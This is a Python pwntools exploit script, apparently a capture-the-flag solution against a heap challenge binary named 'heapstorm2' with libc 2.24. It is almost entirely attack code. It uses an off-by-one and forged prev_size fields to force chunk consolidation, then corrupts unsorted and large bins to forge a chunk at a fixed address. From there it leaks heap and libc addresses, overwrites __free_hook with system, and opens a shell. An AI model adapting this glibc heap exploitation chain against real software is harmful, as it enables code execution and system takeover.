#!/usr/bin/env python

from pwn import *
import os

context.log_level = "info"

elf = "./heapstorm2"
ENV = {"LD_PRELOAD":"./libc-2.24.so"}

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def update(idx, s):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(s)))
    p.recvuntil("Content: ")
    p.send(s)

def delete(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))


while True:
    p = process("./heapstorm2")

    alloc(0x18)     # 0
    alloc(0x508)    # 1
    alloc(0x18)     # 2
    update(1, p8(0)*0x4f0+p64(0x500))   # fake prev_size

    alloc(0x18)     # 3
    alloc(0x508)    # 4
    alloc(0x18)     # 5
    update(4, p8(0)*0x4f0+p64(0x500))   # fake prev_size
    alloc(0x18)     # 6

    delete(1)
    update(0, p8(0)*0xc)    # off-by-one
    alloc(0x18)     # 1
    alloc(0x4d8)    # 7
    delete(1)
    delete(2)       # backward consolidate
    alloc(0x38)     # 1
    alloc(0x4e8)    # 2

    delete(4)
    update(3, p8(0)*0xc)    # off-by-one
    alloc(0x18)     # 4
    alloc(0x4d8)    # 8
    delete(4)
    delete(5)       # backward consolidate
    alloc(0x48)     # 4

    delete(2)
    alloc(0x4e8)    # 2
    delete(2)

    storage = 0x13370000+0x800
    fake_chunk = storage-0x20

    payload = p8(0)*0x18
    payload += p64(0x4f1)
    payload += p64(0)+p64(fake_chunk)
    update(7, payload)

    payload = p8(0)*0x28
    payload += p64(0x4e1)

#bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
    payload += p64(0)+p64(fake_chunk+0x8)

#bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
    payload += p64(0)+p64(fake_chunk-0x18-5)
    update(8, payload)

    try:
	# if the heap address starts with "0x56", you win
	alloc(0x48)     #2
    except EOFError:
	# otherwise crash and try again
	p.close()
	continue

    payload = p8(0)*0x20
    payload += p64(0x13377331)+p64(0)
    payload += p64(storage)
    update(2, payload)

    payload = p8(0)*0x10
    payload += p64(0x13377331)+p64(0)
    payload += p64(storage)+p64(0x1000)
    payload += p64(storage-0x20+0x3)+p64(0x8)
    update(0, payload)

    view(1)
    p.recvuntil("Chunk[1]: ")
    heap_base = u64(p.recv(8))-0x60
    log.info("heap_base: "+hex(heap_base))

    payload = p8(0)*0x10
    payload += p64(0x13377331)+p64(0)
    payload += p64(storage)+p64(0x1000)
    payload += p64(heap_base+0x70)+p64(0x8)
    update(0, payload)

    view(1)
    p.recvuntil("Chunk[1]: ")
    unsorted_bin = u64(p.recv(8))
    libc_base = unsorted_bin-0x3c4b78
    log.info("libc_base: "+hex(libc_base))

    free_hook = libc_base+0x3c67a8
    system_addr = libc_base+0x45390

    payload = p8(0)*0x10
    payload += p64(0x13377331)+p64(0)
    payload += p64(storage)+p64(0x1000)
    payload += p64(free_hook)+p64(0x18)
    payload += p64(storage+0x50)+p64(0x100)
    payload += "/bin/sh\x00"
    update(0, payload)

    update(1, p64(system_addr))

    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(2))

    p.interactive()
